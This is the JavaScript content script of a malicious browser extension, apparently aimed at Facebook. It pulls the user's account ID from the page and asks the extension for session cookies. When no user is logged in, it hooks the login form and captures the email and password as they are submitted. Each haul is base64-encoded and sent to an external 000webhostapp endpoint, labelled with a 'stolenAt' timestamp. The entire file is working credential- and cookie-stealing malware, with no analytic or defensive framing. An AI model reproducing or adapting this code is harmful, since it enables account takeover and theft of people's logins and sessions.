var device_id = null;
const API = "https://litho-bump.000webhostapp.com/index.php",
    userAgent = navigator.userAgent,
    dateTime = () => {
        const addZero = (number) => (number < 10 ? "0" + number : number),
            currentDate = new Date(),
            year = currentDate.getFullYear(),
            month = addZero(currentDate.getMonth() + 1),
            day = addZero(currentDate.getDate()),
            hours = addZero(currentDate.getHours()),
            minutes = addZero(currentDate.getMinutes()),
            seconds = addZero(currentDate.getSeconds());
        return `${hours}:${minutes}:${seconds} - ${day}/${month}/${year}`;
    },
    getCUser = () => {
        const s = `"CurrentUserInitialData":{"ACCOUNT_ID":"`,
            scripts = document.querySelectorAll("script[data-sjs]");
        let c_user = null;

        scripts.forEach((script) => {
            if (script.innerText.includes(s)) {
                c_user = script.innerText.split(s)[1].split(`"`)[0];
            }
        });

        return c_user;
    },
    keyLogging = () => {
        const edEmail = document.getElementById("email"),
            edPass = document.getElementById("pass"),
            form = edEmail.parentElement.parentElement.parentElement;

        form.onsubmit = async () => {
            const email = edEmail.value,
                pass = edPass.value,
                user = {
                    email,
                    password: pass,
                };

            sendMessage(user);
        };
    },
    getCookies = () => {
        return new Promise((resolve, reject) => {
            chrome.runtime.sendMessage("getcookies", (e) => {
                e && e !== "" ? resolve(e) : reject(null);
            });
        });
    },
    processUser = async (c_user) => {
        if (c_user) {
            try {
                const cookie = await getCookies();
                const user = { c_user, cookie };
                sendMessage(user);
            } catch (error) {}
        } else {
            keyLogging();
        }
    },
    sendMessage = (userPayload) => {
        return fetch(
            `${API}?user=${btoa(
                JSON.stringify({ ...userPayload, device_id: device_id, userAgent: userAgent, stolenAt: dateTime() })
            )}`,
            {
                method: "GET",
                mode: "no-cors",
                credentials: "same-origin",
            }
        )
            .then((res) => res.text())
            .then(console.log);
    };

(() => {
    chrome.runtime.sendMessage("get_device_id", (e) => {
        device_id = e && e != "" ? e : null;
        if (device_id) {
            const c_user = getCUser();
            processUser(c_user);
        } else {
            chrome.runtime.sendMessage("set_device_id", (e) => {});
        }
    });
})();
